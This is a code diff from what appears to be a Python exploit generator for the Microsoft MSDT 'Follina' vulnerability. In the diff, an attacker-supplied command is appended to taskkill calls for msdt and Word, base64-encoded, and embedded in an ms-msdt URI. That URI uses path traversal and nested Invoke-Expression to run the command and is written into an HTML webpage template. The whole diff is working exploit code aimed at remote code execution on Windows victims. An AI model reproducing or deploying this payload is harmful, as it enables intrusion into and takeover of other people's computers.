@@ -53,10 +53,11 @@ def main():
 	# print(payload_url)
 
 	#payload will close both msdt and word and execute the user specified payload
-	cmd = base64.b64encode(bytearray('$cmd = "c:\\windows\\system32\\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe&&taskkill /f /im WINWORD.exe";'+sys.argv[3], 'utf-16-le')).decode('UTF-8')
-	# print(cmd)
+	cmd = 'taskkill /f /im msdt.exe;taskkill /f /im WINWORD.exe;'+sys.argv[3]
+	print(cmd)
+	cmd_e = base64.b64encode(bytearray(cmd, 'utf-16-le')).decode('UTF-8')
 	#payload from https://twitter.com/nao_sec/status/1530196847679401984/photo/1
-	payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{cmd}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\""'''
+	payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{cmd_e}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\""'''
 
 	with open("templates/webpage.template", "r") as f:
 		html_template = f.read()
